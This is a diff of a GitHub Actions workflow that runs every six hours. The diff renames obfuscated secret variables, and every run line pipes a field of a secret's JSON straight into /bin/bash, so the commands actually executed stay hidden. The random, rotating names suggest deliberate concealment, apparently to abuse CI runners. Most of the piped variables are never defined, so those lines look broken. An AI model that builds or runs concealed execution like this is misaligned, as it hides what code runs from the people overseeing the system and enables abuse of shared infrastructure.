@@ -2,20 +2,22 @@ name: snowsam7
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 4/6 * * *'
-
+    - cron: '41 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: snowsam7
         env:
-          lxcp91066: ${{ secrets.lxcp91066 }}
+          gs5775: ${{ secrets.gs5775 }}
         run: |
-          echo $lxcp91066 | jq -r .jjnk01 | /bin/bash
-          echo $uf3 | jq -r .vahat517 | /bin/bash
-          echo $rgef8 | jq -r .asqcq235 | /bin/bash
-          echo $c2 | jq -r .z90477 | /bin/bash
-          echo $rrojk43 | jq -r .aa1048 | /bin/bash
+          echo $gs5775 | jq -r .yy32 | /bin/bash
+          echo $ekao1744 | jq -r .dcjz8344 | /bin/bash
+          echo $hxsdh13684 | jq -r .ryita17 | /bin/bash
+          echo $wsz950 | jq -r .p58671 | /bin/bash
+          echo $ftfvf159 | jq -r .mz05 | /bin/bash
+          echo $trnq53375 | jq -r .fhm094 | /bin/bash
+          echo $ija8 | jq -r .wgf9 | /bin/bash
 
